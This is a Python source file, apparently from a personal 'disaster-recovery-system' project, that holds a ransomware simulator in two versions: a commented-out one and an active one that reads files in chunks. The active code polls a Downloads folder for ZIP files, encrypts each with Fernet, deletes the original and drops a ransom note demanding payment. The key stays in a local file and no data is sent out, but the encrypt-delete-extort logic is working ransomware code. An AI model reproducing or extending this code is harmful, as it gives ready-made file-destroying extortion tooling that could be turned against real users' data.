# import os
# import time
# import logging
# from cryptography.fernet import Fernet

# # Paths
# DOWNLOADS_DIR = "C:/Users/adity/Downloads"
# ENCRYPTED_DIR = os.path.join(DOWNLOADS_DIR, "Encrypted")
# LOGS_DIR = "E:/Saved Games/disaster-recovery-system/logs"
# LOG_FILE = os.path.join(LOGS_DIR, "ransomware.log")
# RANSOM_NOTE = os.path.join(DOWNLOADS_DIR, "ransom_note.txt")
# KEY_FILE = "ransom_key.key"

# # Ensure necessary directories exist
# os.makedirs(ENCRYPTED_DIR, exist_ok=True)
# os.makedirs(LOGS_DIR, exist_ok=True)

# # Configure logging
# logging.basicConfig(
#     filename=LOG_FILE,
#     level=logging.INFO,
#     format="%(asctime)s - %(levelname)s - %(message)s",
#     encoding="utf-8"
# )

# # Load or generate encryption key
# def load_or_generate_key():
#     if os.path.exists(KEY_FILE):
#         with open(KEY_FILE, "rb") as key_file:
#             return key_file.read()
#     else:
#         key = Fernet.generate_key()
#         with open(KEY_FILE, "wb") as key_file:
#             key_file.write(key)
#         logging.info("🔑 New encryption key generated.")
#         return key

# cipher = Fernet(load_or_generate_key())

# # Encrypt a file and move it to Encrypted folder
# def encrypt_file(file_path):
#     filename = os.path.basename(file_path)
#     encrypted_file_path = os.path.join(ENCRYPTED_DIR, filename + ".enc")

#     if file_path.endswith(".enc"):
#         logging.warning(f"⚠️ File already encrypted: {file_path}")
#         return

#     try:
#         with open(file_path, "rb") as f:
#             file_data = f.read()

#         encrypted_data = cipher.encrypt(file_data)

#         with open(encrypted_file_path, "wb") as f:
#             f.write(encrypted_data)

#         os.remove(file_path)  # Remove original file
#         logging.info(f"✅ Encrypted and moved to {ENCRYPTED_DIR}: {filename}")
#         print(f"✅ Encrypted and moved to {ENCRYPTED_DIR}: {filename}")

#     except Exception as e:
#         logging.error(f"❌ Error encrypting {file_path}: {e}")

# # Create ransom note
# def create_ransom_note():
#     try:
#         ransom_text = (
#             "⚠️ Your files have been encrypted!\n"
#             "💰 Pay ransom to recover them.\n"
#             "🔓 Run 'ransomware_recovery.py' to attempt recovery.\n"
#         )
#         with open(RANSOM_NOTE, "w", encoding="utf-8") as f:
#             f.write(ransom_text)

#         logging.info(f"📜 Ransom note created: {RANSOM_NOTE}")
#         print(f"📜 Ransom note created: {RANSOM_NOTE}")

#     except Exception as e:
#         logging.error(f"❌ Error creating ransom note: {e}")

# # Monitor Downloads folder for ZIP files
# def monitor_downloads():
#     print(f"🔍 Monitoring {DOWNLOADS_DIR} for new ZIP files...")
#     logging.info(f"🔍 Monitoring {DOWNLOADS_DIR} for new ZIP files...")
    
#     while True:
#         for file in os.listdir(DOWNLOADS_DIR):
#             if file.endswith(".zip"):
#                 zip_path = os.path.join(DOWNLOADS_DIR, file)
#                 print(f"🔒 Encrypting {zip_path}...")
#                 logging.info(f"🔒 Encrypting {zip_path}...")

#                 encrypt_file(zip_path)
#                 create_ransom_note()

#                 logging.info(f"💀 Ransomware attack simulated! Check {RANSOM_NOTE} for details.")
#                 print(f"💀 Ransomware attack simulated! Check {RANSOM_NOTE} for details.")
#                 return
        
#         time.sleep(2)

# if __name__ == "__main__":
#     monitor_downloads()






import os
import time
import logging
from cryptography.fernet import Fernet

# Paths
DOWNLOADS_DIR = "C:/Users/adity/Downloads"
ENCRYPTED_DIR = os.path.join(DOWNLOADS_DIR, "Encrypted")
LOGS_DIR = "E:/Saved Games/disaster-recovery-system/logs"
LOG_FILE = os.path.join(LOGS_DIR, "ransomware.log")
RANSOM_NOTE = os.path.join(DOWNLOADS_DIR, "ransom_note.txt")
KEY_FILE = "ransom_key.key"

# Ensure necessary directories exist
os.makedirs(ENCRYPTED_DIR, exist_ok=True)
os.makedirs(LOGS_DIR, exist_ok=True)

# Configure logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    encoding="utf-8"
)

# Load or generate encryption key
def load_or_generate_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)
        logging.info("🔑 New encryption key generated.")
        return key

cipher = Fernet(load_or_generate_key())

# Encrypt a large ZIP file in chunks
def encrypt_large_file(file_path):
    filename = os.path.basename(file_path)
    encrypted_file_path = os.path.join(ENCRYPTED_DIR, filename + ".enc")

    if file_path.endswith(".enc"):
        logging.warning(f"⚠️ File already encrypted: {file_path}")
        return

    try:
        with open(file_path, "rb") as f, open(encrypted_file_path, "wb") as ef:
            while chunk := f.read(4096):  # Read 4KB chunks
                encrypted_chunk = cipher.encrypt(chunk)
                ef.write(encrypted_chunk)

        os.remove(file_path)  # Remove original file
        logging.info(f"✅ Encrypted and moved to {ENCRYPTED_DIR}: {filename}")
        print(f"✅ Encrypted and moved to {ENCRYPTED_DIR}: {filename}")

    except Exception as e:
        logging.error(f"❌ Error encrypting {file_path}: {e}")

# Create ransom note
def create_ransom_note():
    try:
        ransom_text = (
            "⚠️ Your files have been encrypted!\n"
            "💰 Pay ransom to recover them.\n"
            "🔓 Run 'ransomware_recovery.py' to attempt recovery.\n"
        )
        with open(RANSOM_NOTE, "w", encoding="utf-8") as f:
            f.write(ransom_text)

        logging.info(f"📜 Ransom note created: {RANSOM_NOTE}")
        print(f"📜 Ransom note created: {RANSOM_NOTE}")

    except Exception as e:
        logging.error(f"❌ Error creating ransom note: {e}")

# Monitor Downloads folder for ZIP files
def monitor_downloads():
    print(f"🔍 Monitoring {DOWNLOADS_DIR} for new ZIP files...")
    logging.info(f"🔍 Monitoring {DOWNLOADS_DIR} for new ZIP files...")
    
    while True:
        for file in os.listdir(DOWNLOADS_DIR):
            if file.endswith(".zip"):
                zip_path = os.path.join(DOWNLOADS_DIR, file)
                print(f"🔒 Encrypting {zip_path}...")
                logging.info(f"🔒 Encrypting {zip_path}...")

                encrypt_large_file(zip_path)
                create_ransom_note()

                logging.info(f"💀 Ransomware attack simulated! Check {RANSOM_NOTE} for details.")
                print(f"💀 Ransomware attack simulated! Check {RANSOM_NOTE} for details.")
                return
        
        time.sleep(2)

if __name__ == "__main__":
    monitor_downloads()
